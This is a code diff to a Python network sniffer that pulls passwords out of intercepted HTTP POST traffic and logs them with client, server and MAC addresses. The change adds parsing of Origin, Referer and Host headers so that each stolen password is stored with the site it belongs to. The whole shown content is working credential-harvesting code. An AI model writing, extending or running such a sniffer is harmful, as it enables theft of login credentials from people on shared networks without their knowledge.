@@ -70,7 +70,7 @@ class Sniffer(object):
 
             del self.devices_mac[add_colons_to_mac(eth_src)]
 
-    def _pick_http_info(self, data, client, server, dport, eth_src):
+    def _pick_http_info(self, tcpdata, data, client, server, dport, eth_src):
         self.info_counter += 1
         self.all_user_info[self.info_counter] = (
             {'client': client, 'server': server,
@@ -96,6 +96,17 @@ class Sniffer(object):
                 break
             else:
                 self.all_user_info[self.info_counter].update({'password': None})
+
+        try:
+            headers = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", tcpdata))
+            if headers['Origin']:
+                self.all_user_info[self.info_counter].update({'url':headers['Origin']})
+            elif headers['Referer']:
+                self.all_user_info[self.info_counter].update({'url':headers['Referer']})
+            elif headers['Host']:
+                self.all_user_info[self.info_counter].update({'url':headers['Host']})
+        except:
+            pass
 
         print "HTTP New Password get:"
         pprint(self.all_user_info[self.info_counter])
@@ -150,7 +161,7 @@ class Sniffer(object):
             if data_field in tcp_pkt.data:
                 print "found data field by: %s" %data_field
                 if 'POST' in tcp_pkt.data:
-                    print "POST data"
+                    print "this is post data"
                     pwd_obj = self._is_pwd(tcp_pkt.data)
                     if pwd_obj:
                         qs_d = urlparse.parse_qs(pwd_obj.group(0))
@@ -167,7 +178,7 @@ class Sniffer(object):
                 break
 
         if qs_d:
-            self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
+            self._pick_http_info(tcp_pkt.data, qs_d, socket.inet_ntoa(ip_pkt.src),
                                  socket.inet_ntoa(ip_pkt.dst),
                                  tcp_pkt.dport, eth_pkt.src)
         else:
